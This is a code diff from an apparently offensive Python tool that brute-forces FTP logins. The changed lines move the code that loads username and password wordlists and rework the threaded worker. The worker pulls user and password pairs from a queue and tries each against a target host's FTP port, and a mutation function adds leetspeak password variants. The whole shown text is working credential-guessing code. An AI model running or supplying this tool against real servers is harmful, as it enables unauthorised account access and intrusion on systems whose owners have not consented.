@@ -27,28 +27,7 @@ passfile = args.passfile
 threads = args.threads if args.threads else 20
 mutant = args.mutate
 
-def passwd(passfile):
-    with open(passfile , 'r', encoding='utf-8') as f:
-        return[line.strip('\n') for line in f]
-    
 
-
-def userb(user):
-    with open(user , 'r' , encoding='utf-8') as f:
-        return[line.strip('\n') for line in f]
-    
-users = userb(user)
-
-passwords = passwd(passfile)
-#passwords_iter = iter(passwords)
-event_done = threading.Event()
-
-trueuser = None
-truepasswd = None
-
-
-
-        
 def smart_mutate(base_word):
     leet_map = {'a': '@', 'i': '1', 'e': '3', 'o': '0', 's': '$'}
 
@@ -74,6 +53,33 @@ def smart_mutate(base_word):
     return mutations
 
 
+
+
+
+def passwd(passfile):
+    with open(passfile , 'r', encoding='utf-8') as f:
+        return[line.strip('\n') for line in f]
+    
+passwords = passwd(passfile)
+
+
+def userb(user):
+    with open(user , 'r' , encoding='utf-8') as f:
+        return[line.strip('\n') for line in f]
+    
+users = userb(user)
+
+
+#passwords_iter = iter(passwords)
+event_done = threading.Event()
+
+trueuser = None
+truepasswd = None
+
+
+
+        
+
 if mutant:
     for userc in users:
         for base in passwords:
@@ -90,12 +96,16 @@ else:
 
 def workers():
     global trueuser, truepasswd
-    while not event_done.is_set():
-        try:
-            userc, password = combo_queue.get_nowait()
-        except Exception:
+    while not combo_queue.empty():
+        if stop_event.is_set():
             break
+        
+        userc, password = combo_queue.get()
+        
         try:
+            if stop_event.is_set():
+                combo_queue.task_done()
+                return
             with ftplib.FTP() as serve:
                 serve.connect(host, 21, timeout=5)
                 serve.login(userc, password)
